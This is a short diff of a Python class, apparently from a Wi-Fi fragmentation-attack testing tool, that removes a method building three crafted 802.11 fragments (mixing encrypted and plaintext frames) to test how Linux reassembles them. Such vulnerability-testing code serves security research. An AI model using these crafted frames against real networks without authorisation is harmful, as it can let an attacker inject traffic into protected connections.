@@ -330,28 +330,6 @@ class Station():
 
 		return test
 
-	def generate_linux_attack(self):
-		test = TestCase()
-		seqnum = 0xAA
-
-		# Frame 1: encrypted normal fragment
-		frag1 = Dot11(type="Data", FCfield="MF", SC=(seqnum << 4) | 0)/Raw(b"A" * 16)
-		self.set_header(frag1)
-		test.fragments.append(MetaFrag(frag1, MetaFrag.AfterAuth, True))
-
-		# Frame 2: encrypted fragment with different CS but incremental PN.
-		#	   sent fragmented to prevent receiving from processing it.
-		frag2 = Dot11(type="Data", SC=((seqnum ^ 1) << 4) | 1)/Raw(b"B" * 16)
-		self.set_header(frag1)
-		test.fragments.append(MetaFrag(frag2, MetaFrag.AfterAuth, True))
-
-		# Frame 3: plaintext fragment with same CS as the first encrypted fragment
-		frag3 = Dot11(type="Data", SC=(seqnum << 4) | 1)/Raw(b"C" * 16)
-		self.set_header(frag1)
-		test.fragments.append(MetaFrag(frag3, MetaFrag.AfterAuth, False))
-
-		return test
-
 	def generate_test_rekey(self):
 		magic = b"rekey_attack"
 		header = self.get_header()
@@ -370,7 +348,6 @@ class Station():
 		#self.test = self.generate_test_ping(MetaFrag.AfterAuth, num_frags=1, encrypted=True)
 		#self.text = self.generate_test_eapol()
 		#self.test = self.generate_test_eapol_debug()
-		#self.test = self.generate_linux_attack()
 		#self.test = TestCase()
 		#self.test = self.generate_test_ping_mixed()
 		#self.test = self.generate_linux_attack_ping()
